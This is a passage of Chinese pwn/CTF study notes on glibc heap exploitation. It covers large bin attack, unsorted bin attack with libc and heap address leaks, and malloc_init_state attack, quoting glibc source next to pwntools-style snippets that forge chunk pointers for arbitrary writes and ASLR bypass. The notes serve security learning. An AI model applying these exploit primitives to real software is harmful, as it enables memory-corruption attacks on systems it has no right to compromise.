</span></span><span class=line><span class=cl>        <span class=n>bck</span> <span class=o>=</span> <span class=n>fwd</span><span class=o>-&gt;</span><span class=n>bk</span><span class=p>;</span><span class=c1>//【5】
</span></span></span><span class=line><span class=cl><span class=c1></span>      <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span><span class=k>else</span><span class=p>{...}</span>
</span></span><span class=line><span class=cl>  <span class=p>...</span>
</span></span><span class=line><span class=cl>  <span class=n>victim</span><span class=o>-&gt;</span><span class=n>bk</span> <span class=o>=</span> <span class=n>bck</span><span class=p>;</span><span class=c1>//【6】
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>victim</span><span class=o>-&gt;</span><span class=n>fd</span> <span class=o>=</span> <span class=n>fwd</span><span class=p>;</span><span class=c1>//【7】
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>fwd</span><span class=o>-&gt;</span><span class=n>bk</span> <span class=o>=</span> <span class=n>victim</span><span class=p>;</span><span class=c1>//【8】
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>bck</span><span class=o>-&gt;</span><span class=n>fd</span> <span class=o>=</span> <span class=n>victim</span><span class=p>;</span><span class=c1>//【9】
</span></span></span></code></pre></div></div><p><strong>利用</strong></p><ol><li>劫持 large bin 中一个<strong>在同等大小 chunk 中 bk 方向最靠前的 chunk</strong> 的 <strong>bk</strong> 和 <strong>bk_nextsize</strong></li><li>然后释放一个比该 chunk <strong>稍大一些</strong>的 chunk</li></ol><img src=/img/pwn_note.zh-cn.assets/image-20241126133526023.png alt=图片无法加载><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>malloc</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x400</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>malloc</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mh>0x10</span><span class=p>)</span> <span class=c1># 用于分隔</span>
</span></span><span class=line><span class=cl><span class=n>malloc</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=mh>0x410</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>malloc</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span> <span class=mh>0x10</span><span class=p>)</span> <span class=c1># 用于分隔</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=c1># chunk0进入unsorted bin</span>
</span></span><span class=line><span class=cl><span class=n>malloc</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span> <span class=mh>0x500</span><span class=p>)</span> <span class=c1># 由于0x400无法满足0x500，chunk0进入large bin</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s2>&#34;stderr&#34;</span><span class=p>]</span><span class=o>-</span><span class=mh>0x10</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;_IO_list_all&#39;</span><span class=p>]</span><span class=o>-</span><span class=mh>0x20</span><span class=p>))</span> <span class=c1># UAF伪造</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span> <span class=c1># chunk2进入unsorted bin</span>
</span></span><span class=line><span class=cl><span class=n>malloc</span><span class=p>(</span><span class=mi>5</span><span class=p>,</span> <span class=mh>0x500</span><span class=p>)</span> <span class=c1># chunk2进入large bin 触发两处任意地址写，将stderr和_IO_list_all改为chunk2地址</span>
</span></span><span class=line><span class=cl><span class=c1># glibc-2.31后，只能利用一处，即edit(4, p64(0)*3 + p64(target_addr - 0x20))</span></span></span></code></pre></div></div><p><strong>原理</strong></p><ul><li><p>glibc-2.30 后，在遍历 unsorted bin 将堆块放入 large bin 代码中【申请 size 大于等于最小 large bin size】中加入检查</p></li><li><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nf>__glibc_unlikely</span> <span class=p>(</span><span class=n>fwd</span><span class=o>-&gt;</span><span class=n>bk_nextsize</span><span class=o>-&gt;</span><span class=n>fd_nextsize</span> <span class=o>!=</span> <span class=n>fwd</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=c1>// 旧版本控制该fd_nextsize为target，此处将不能利用
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=nf>malloc_printerr</span> <span class=p>(</span><span class=s>&#34;malloc(): largebin double linked list corrupted (nextsize)&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=n>bck</span><span class=o>-&gt;</span><span class=n>fd</span> <span class=o>!=</span> <span class=n>fwd</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=nf>malloc_printerr</span> <span class=p>(</span><span class=s>&#34;malloc(): largebin double linked list corrupted (bk)&#34;</span><span class=p>);</span></span></span></code></pre></div></div></li></ul><p><strong>利用</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>*</span><span class=mi>3</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;_IO_list_all&#39;</span><span class=p>]</span><span class=o>-</span><span class=mh>0x20</span><span class=p>))</span> <span class=c1># UAF伪造，写入的地址为chunk 2的</span></span></span></code></pre></div></div><p>利用【申请 size 小于最小 large bin size】如下这段代码，伪造<code>bk_nextsize</code>来达成一处任意地址写大数</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=n>fwd</span> <span class=o>!=</span> <span class=n>bck</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=n>size</span> <span class=o>|=</span> <span class=n>PREV_INUSE</span><span class=p>;</span> <span class=p>...</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>((</span><span class=kt>unsigned</span> <span class=kt>long</span><span class=p>)(</span><span class=n>size</span><span class=p>)</span> <span class=o>&lt;</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>long</span><span class=p>)(</span><span class=n>bck</span><span class=o>-&gt;</span><span class=n>bk</span><span class=o>-&gt;</span><span class=n>size</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>        <span class=n>fwd</span> <span class=o>=</span> <span class=n>bck</span><span class=p>;</span>		<span class=c1>// 【1】
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=n>bck</span> <span class=o>=</span> <span class=n>bck</span><span class=o>-&gt;</span><span class=n>bk</span><span class=p>;</span>	<span class=c1>// 【2】
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>        <span class=n>victim</span><span class=o>-&gt;</span><span class=n>fd_nextsize</span> <span class=o>=</span> <span class=n>fwd</span><span class=o>-&gt;</span><span class=n>fd</span><span class=p>;</span> <span class=c1>// 【3】
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=n>victim</span><span class=o>-&gt;</span><span class=n>bk_nextsize</span> <span class=o>=</span> <span class=n>fwd</span><span class=o>-&gt;</span><span class=n>fd</span><span class=o>-&gt;</span><span class=n>bk_nextsize</span><span class=p>;</span> <span class=c1>// 【4】
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=n>fwd</span><span class=o>-&gt;</span><span class=n>fd</span><span class=o>-&gt;</span><span class=n>bk_nextsize</span> <span class=o>=</span> <span class=n>victim</span><span class=o>-&gt;</span><span class=n>bk_nextsize</span><span class=o>-&gt;</span><span class=n>fd_nextsize</span> <span class=o>=</span> <span class=n>victim</span><span class=p>;</span> <span class=c1>// 【5】
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>}</span></span></span></code></pre></div></div><p>申请 0x500 的大堆可使得 target 指向 0x420 victim</p><img src=/img/pwn_note.zh-cn.assets/image-20241127125247206.png alt=图片无法加载><p>申请 0x200 的小堆可使得 target 指向 0x430 的堆，走的过程：</p><ul><li>unsorted bin 中直接切割 chunk 条件中的<code>victim==av->last_remainder</code>不满足，进入 large bin 触发 attack</li><li>接着程序在 large bin 中按 size 升序找合适的 chunk 切割出所需内存，通过 bk_nextsize 访问最小的 chunk 即访问到 0x430 的堆</li></ul><img src=/img/pwn_note.zh-cn.assets/image-20241127132408572.png alt=图片无法加载><h3 id=unsorted-bin-attack>Unsorted bin attack</h3><h4 id=地址泄露-2>地址泄露</h4><p><strong>libc 地址泄露</strong></p><p>结合 off-by-null 或 UAF</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=c1># UAF</span>
</span></span><span class=line><span class=cl><span class=n>create</span><span class=p>(</span><span class=mh>0x100</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;&#39;</span><span class=p>)</span> <span class=c1># chunk 0</span>
</span></span><span class=line><span class=cl><span class=n>create</span><span class=p>(</span><span class=mh>0x60</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;&#39;</span><span class=p>)</span> <span class=c1># chunk 1 防止与top chunk合并，此处为fast bin</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=c1># chunk 0 进入 unsorted bin   后续create(0x100, b&#39;&#39;)可继续使用该块</span>
</span></span><span class=line><span class=cl><span class=n>show</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span></span></span></code></pre></div></div><ul><li><p>unsrted bin 双向链表，所以必有一个节点的 fd 指针指向 main_arena 结构体内部</p></li><li><p>构造出一个堆块进入 unsorted bin 形成下图结构，伪造堆块 bin1，UAF 未置指针为 0，显示 bin1 内容可以泄露出 fd 指针指向的一个与<code>main_arena</code>有固定偏移的地址，该偏移可调试得出</p></li><li><p><code>main_arena</code> 是一个 <code>struct malloc_state</code> 类型的全局变量，是 <code>ptmalloc</code> 管理主分配区的唯一实例，被分配在 <code>.data</code> 或者 <code>.bss</code> 等段上，通过进程所使用的 <code>libc</code> 的 <code>.so</code> 文件，获得 <code>main_arena</code> 与 <code>libc</code> 基地址的偏移，实现对 <code>ASLR</code> 的绕过，也可通过 glibc-2.23 中<code>malloc_hook = main_arena - 0x10</code>的偏移计算</p></li><li><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>main_arena_offset</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&#34;libc.so.6&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s2>&#34;__malloc_hook&#34;</span><span class=p>]</span> <span class=o>+</span> <span class=mh>0x10</span> <span class=c1># pwntools</span></span></span></code></pre></div></div></li><li><p>glibc-2.23 中指向 main_arena 偏移 88 的地址</p></li></ul><img src=/img/pwn_note.zh-cn.assets/172844676894980.png><p><strong>通过 main_arena 获取 libc 基址：main_arena 存储在 libc.so.6 文件的.data 段，IDA 打开 libc 文件，搜索<code>malloc_trim()</code>，如图得到偏移地址</strong></p><img src=/img/pwn_note.zh-cn.assets/172844676894981.png alt=图片无法加载><p>获取 libc 基址后获取<code>malloc_hook</code>和<code>realloc</code>地址</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=n>malloc_hook_addr</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;__malloc_hook&#39;</span><span class=p>]</span> <span class=c1># &lt;__malloc_hook&gt;</span>
</span></span><span class=line><span class=cl><span class=n>realloc_addr</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;realloc&#39;</span><span class=p>]</span> <span class=c1># &lt;__GI___libc_realloc&gt;</span></span></span></code></pre></div></div><p><strong>泄露堆地址</strong></p><p>申请多个堆块</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x80</span><span class=p>)</span> <span class=c1># chunk 0</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span> <span class=mh>0x20</span><span class=p>)</span> <span class=c1># 分割unsorted bin防止合并</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mh>0x80</span><span class=p>)</span> <span class=c1># chunk 1</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span> <span class=mh>0x20</span><span class=p>)</span> <span class=c1># 分割unsorted bin防止合并</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=mh>0x80</span><span class=p>)</span> <span class=c1># chunk 2</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x80</span><span class=p>)</span> <span class=c1># chunk 0 再次被申请，fd-&gt;main_arena偏移地址 &amp; bk-&gt;堆地址</span>
</span></span><span class=line><span class=cl><span class=n>show</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=c1># 打印main_arena偏移, 由于0截断无法打印堆地址</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>8</span><span class=p>)</span> <span class=c1># 填充将0去除</span>
</span></span><span class=line><span class=cl><span class=n>show</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=c1># 将打印出的值最后3位改为0即为堆地址</span></span></span></code></pre></div></div><h4 id=任意地址写大数>任意地址写大数</h4><ul><li>通过该技巧可以用于绕过判断检查等，如向<code>global_max_fast</code>写入一个大值，扩大 fastbin 范围</li><li>控制 bk 值将<code>unsorted_chunks(av)</code>写到任意地址，glibc-2.28 之前版本可利用</li></ul><p><strong>绕过</strong></p><ul><li><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nf>__builtin_expect</span> <span class=p>(</span><span class=nf>chunksize_nomask</span> <span class=p>(</span><span class=n>victim</span><span class=p>)</span> <span class=o>&lt;=</span> <span class=mi>2</span> <span class=o>*</span> <span class=n>SIZE_SZ</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl> <span class=o>||</span> <span class=nf>__builtin_expect</span> <span class=p>(</span><span class=nf>chunksize_nomask</span> <span class=p>(</span><span class=n>victim</span><span class=p>)</span> <span class=o>&gt;</span> <span class=n>av</span><span class=o>-&gt;</span><span class=n>system_mem</span><span class=p>,</span> <span class=mi>0</span><span class=p>))</span></span></span></code></pre></div></div><p>fake chunk 被链入 unsorted bin 中，将其申请出来需要保证 size 合法</p></li><li><p>且 unsorted bin chunk 的 bk 字段指向地址必须可写</p></li></ul><p><strong>原理</strong></p><p><code>Unsorted bin</code>遍历堆块使用<code>bk</code>指针，malloc 取出 victim 代码使得其 fd 内填入本 unsorted bin 的地址</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-C"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=c1>// glibc-2.23 _int_malloc
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>victim</span> <span class=o>=</span> <span class=nf>unsorted_chunks</span> <span class=p>(</span><span class=n>av</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>bk</span><span class=p>;</span> <span class=c1>// 链表尾部堆块：victim
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>bck</span> <span class=o>=</span> <span class=n>victim</span><span class=o>-&gt;</span><span class=n>bk</span><span class=p>;</span>                  <span class=c1>// 倒数第二堆块：bck
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=c1>// 将victim 从 unsorted bin脱链取出，漏洞点在于未检查bck-&gt;fd是否等于victim，glibc-2.28修复加入检查
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nf>unsorted_chunks</span><span class=p>(</span><span class=n>av</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>bk</span> <span class=o>=</span> <span class=n>bck</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>bck</span><span class=o>-&gt;</span><span class=n>fd</span> <span class=o>=</span> <span class=nf>unsorted_chunks</span><span class=p>(</span><span class=n>av</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=c1>// 此处向bck-&gt;fd即((target-0x10)+0x10)处写入main_aren偏移的unsorted bin地址，包括7f可达成写入7f构造目的
</span></span></span></code></pre></div></div><p><strong>利用</strong></p><ul><li><p>通过堆溢出或其他漏洞修改<code>unsorted bin</code>中堆块的<code>bk(addr+0x8)</code>为<code>target_addr - 0x10</code></p></li><li><p><code>malloc</code>触发漏洞达成写大数（地址数），即向<code>target_addr</code>写入<code>unsorted_chunks(av)</code>值——<code>mainarena</code>偏移地址</p></li></ul><img src=/img/pwn_note.zh-cn.assets/image-20241125180540007.png alt=图片无法加载><h3 id=malloc_init_state_attack>malloc_init_state_attack</h3><p><strong>原理</strong></p><ul><li>任意地址写将 main_arena 中 flags 最低字节设置为 0</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nf>have_fastchunks</span><span class=p>(</span><span class=n>av</span><span class=p>))</span>
</span></span><span class=line><span class=cl>	<span class=nf>malloc_consolidate</span><span class=p>(</span><span class=n>av</span><span class=p>);</span></span></span></code></pre></div></div><ul><li>任意地址写将<code>global_max_fast</code>置 0</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=c1>// malloc_consolidate
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>if</span> <span class=p>(</span><span class=nf>get_max_fast</span><span class=p>()</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>){...}</span>
</span></span><span class=line><span class=cl><span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=c1>// 初始化调用malloc_init_state
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nf>malloc_init_state</span><span class=p>(</span><span class=n>av</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>check_malloc_state</span><span class=p>(</span><span class=n>av</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span></span></span></code></pre></div></div><p><code>malloc_init_state</code> 中会将 <code>top chunk</code>指针指向 <code>unsorted bin</code></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>av</span><span class=o>-&gt;</span><span class=n>top</span> <span class=o>=</span> <span class=nf>initial_top</span> <span class=p>(</span><span class=n>av</span><span class=p>);</span><span class=c1>// top chunk地址为 &amp;av-&gt;bins[0] - 0x10
</span></span></span></code></pre></div></div><p>此时 top chunk 对应堆块的 size 位为之前 last_remainder 的值，将其指向一个 chunk，使得 size 值为堆地址，足够大，只要不断 malloc 就可分配到 hook 指针</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=p>[</span><span class=n>main_arena</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl><span class=n>top</span> <span class=o>-&gt;</span> <span class=n>top</span> <span class=err>指向自己</span>
</span></span><span class=line><span class=cl><span class=nf>last_remainder</span><span class=p>(</span><span class=n>size</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=n>chunk</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl><span class=n>__free_hook</span></span></span></code></pre></div></div><ul><li>glibc &lt; 2.27，glibc-2.27 之后<code>malloc_consolidate</code>不再调用<code>malloc_init_state</code>，方法失效</li></ul><p><strong>利用</strong></p><p><strong>构造 last_remainder 为堆地址</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x200</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mh>0x200</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=c1># 0 进入 unsorted bin</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x100</span><span class=p>)</span> <span class=c1># 0 进入 small bin, last_remainder指向切割0x100后的剩余部分chunk</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=c1># 全部释放，清空chunk</span></span></span></code></pre></div></div><p><strong>新版本 large bin attack 向 global_max_fast 写 0</strong></p><ul><li>不用 unsorted bin attack，会将 bin 破坏导致无法 malloc</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>*</span><span class=mi>3</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;global_max_fast&#39;</span><span class=p>]</span> <span class=o>-</span> <span class=mh>0x20</span> <span class=o>-</span> <span class=mi>6</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=c1># 通过错位6字节，将高字节中的\x00覆盖global_max_fast</span></span></span></code></pre></div></div><p><strong>修改 perturb_byte 为 0</strong></p><ul><li><p>首先要修复被 large bin attack 破坏掉的堆链表等</p></li><li><p>接着通过多次循环 large bin attack 多次写入\x00 将 perturb_byte(&amp;global_max_fast - 4)赋值为 0</p></li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>4</span><span class=p>):</span>
